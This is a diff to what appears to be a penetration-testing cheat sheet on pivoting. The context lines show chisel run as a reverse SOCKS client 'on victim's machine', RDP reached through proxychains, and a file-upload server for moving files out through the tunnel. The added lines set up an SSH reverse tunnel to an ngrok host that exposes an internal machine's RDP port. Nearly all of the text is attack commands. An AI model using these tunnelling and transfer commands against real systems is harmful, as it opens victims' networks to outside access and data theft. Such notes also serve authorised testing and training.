@@ -217,6 +217,9 @@ socks5 127.0.0.1 1080
 on victim's machine chisel.exe client <ip>:<port> R:socks
 from new terminal --> chisel server -p <forwarded port 4444> --reverse
 proxychains4 xfreerdp /u:<user> /v:<local ip> /p:<password>
+or Using SSH :
+ssh -R 127.0.0.1:<22>:<192.168.1.5>:<3389> <os>@<7.tcp.eu.ngrok.io> -p <11750>
+from new terminal --> xfreerdp /v:localhost:<22>   
 ---------------------------------------------------------------------------------------------------------------
 Transfer file using curl externally :
 proxychains4 python file_upload_server.py <forwarded port 4444>
